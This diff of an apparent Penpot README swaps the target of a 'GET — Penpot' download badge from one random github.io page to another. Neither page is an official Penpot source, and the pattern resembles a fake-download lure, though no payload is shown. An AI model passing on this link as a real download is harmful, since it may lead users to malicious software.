@@ -3,7 +3,7 @@
 
 ![Banner Placeholder](https://itsfoss.com/content/images/2022/09/penpot-opensource-figma-ft.jpg)
 
-[![GET — Penpot](https://img.shields.io/badge/GET%20%E2%80%94%20Penpot-0078D6?style=for-the-badge&logoColor=white)](https://lisarodriguezj632.github.io/.github/Penpot-UI-Design)
+[![GET — Penpot](https://img.shields.io/badge/GET%20%E2%80%94%20Penpot-0078D6?style=for-the-badge&logoColor=white)](https://osieelleholorasa.github.io/.github/Penpot-UI-Design)
 
 ---
 
